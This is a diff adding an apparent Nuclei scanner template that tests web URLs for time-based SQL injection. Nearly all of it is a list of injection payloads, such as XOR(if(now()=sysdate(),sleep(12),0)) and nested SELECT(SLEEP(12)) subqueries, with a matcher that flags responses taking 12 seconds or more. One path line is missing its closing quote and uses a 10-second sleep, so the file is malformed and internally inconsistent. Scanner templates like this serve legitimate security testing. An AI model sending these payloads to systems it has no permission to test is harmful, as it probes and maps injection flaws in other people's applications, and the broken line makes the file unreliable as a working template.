@@ -1,0 +1,36 @@
+id: time-based-sqli-uri-finder
+
+info:
+  name: Time-Based SQL Injection in URI
+  description: Test for Time-Based SQL Injection in URI
+  author: erickfernandox
+  severity: critical
+  tags: sqlinjection
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dont-work-sqli"
+      - "{{BaseURL}}/0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z/"
+      - "{{BaseURL}}?/0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z/"      
+      - "{{BaseURL}}/0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z"    
+      - "{{BaseURL}}/0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
+      - "{{BaseURL}}/(SELECT(0)FROM(SELECT(SLEEP(12)))a)/"
+      - "{{BaseURL}}/' AND (SELECT 5735 FROM (SELECT(SLEEP(12)))YpRn) AND 'Jswp'='Jswp"
+      - "{{BaseURL}}?id=' AND (SELECT 5735 FROM (SELECT(SLEEP(12)))YpRn) AND 'Jswp'='Jswp"      
+      - "{{BaseURL}}/,(select * from (select(sleep(12)))a)/"
+      - "{{BaseURL}}/1) or sleep(12)#/"   
+      - "{{BaseURL}}/1' and sleep(12)"   
+      - "{{BaseURL}}/'sleep(12) --//"
+      - "{{BaseURL}}' sleep(12) --//"         
+      - "{{BaseURL}}/AND SLEEP(12)--"     
+      - "{{BaseURL}}/' AND SLEEP(12) AND '1"     
+      - "{{BaseURL}}/ ORDER BY SLEEP(12)/"     
+      - "{{BaseURL}}/AND (SELECT * FROM (SELECT(SLEEP(12)))bAKL) AND 'vRxe'='vRxe" 
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=12'
